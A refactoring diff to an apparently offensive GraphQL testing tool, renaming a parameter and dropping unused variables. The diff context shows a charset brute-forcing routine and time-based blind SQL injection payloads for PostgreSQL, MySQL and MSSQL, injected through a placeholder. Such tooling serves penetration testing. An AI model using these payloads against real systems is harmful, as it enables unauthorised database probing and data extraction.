@@ -110,7 +110,7 @@ def exec_graphql(url, method, query, headers=None, only_length=0):
         return "\033[91m[!]\033[0m {}".format(str(e))
 
 
-def exec_advanced(URL, method, query, headers):
+def exec_advanced(url, method, query, headers):
     print(query)
 
     # Allow a user to bruteforce character from a charset
@@ -118,7 +118,7 @@ def exec_advanced(URL, method, query, headers):
     if "GRAPHQL_CHARSET" in query:
         graphql_charset = "!$%\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
         for c in graphql_charset:
-            length = exec_graphql(URL, method, query.replace("GRAPHQL_CHARSET", c), headers, only_length=1)
+            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), headers, only_length=1)
             print(
                 "[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace("GRAPHQL_CHARSET", c)))
 
@@ -131,12 +131,12 @@ def exec_advanced(URL, method, query, headers):
 
         for i in range(int(match[0])):
             pattern = "GRAPHQL_INCREMENT_" + match[0]
-            length = exec_graphql(URL, method, query.replace(pattern, str(i)), headers, only_length=1)
+            length = exec_graphql(url, method, query.replace(pattern, str(i)), headers, only_length=1)
             print("[+] \033[92mQuery\033[0m: (\033[91m{}\033[0m) {}".format(length, query.replace(pattern, str(i))))
 
     # Otherwise execute the query and display the JSON result
     else:
-        print(exec_graphql(URL, method, query, headers))
+        print(exec_graphql(url, method, query, headers))
 
 
 def blind_postgresql(url, method, headers):
@@ -144,7 +144,7 @@ def blind_postgresql(url, method, headers):
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(url, method, injected, headers)
+    requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
@@ -153,7 +153,7 @@ def blind_mysql(url, method, headers):
     payload = "'-SLEEP(30); #"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(url, method, injected, headers)
+    requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
@@ -162,7 +162,7 @@ def blind_mssql(url, method, headers):
     payload = "'; WAITFOR DELAY '00:00:30';"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
     injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
-    r = requester(url, method, injected, headers)
+    requester(url, method, injected, headers)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
 
 
